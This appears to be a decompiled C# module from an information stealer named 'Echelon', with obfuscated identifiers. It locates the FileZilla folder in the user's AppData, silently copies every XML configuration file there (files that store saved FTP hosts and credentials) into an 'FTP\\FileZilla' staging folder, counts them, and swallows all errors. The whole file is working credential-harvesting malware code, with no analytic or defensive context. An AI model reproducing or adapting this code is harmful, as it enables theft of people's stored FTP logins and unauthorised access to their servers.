using Echelon;
using System.IO;

internal class ae
{
	public static int a = 0;

	public static string b = Global.AppDate;

	public static void a(string ik)
	{
		string path = b + "\\FileZilla";
		try
		{
			FileInfo[] files = new DirectoryInfo(path).GetFiles("*.xml");
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(ik + "\\FTP\\Filezilla");
				File.Copy(fileInfo.FullName, ik + "\\FTP\\FileZilla" + "\\" + fileInfo.Name, overwrite: true);
				ae.a++;
			}
		}
		catch
		{
		}
	}
}
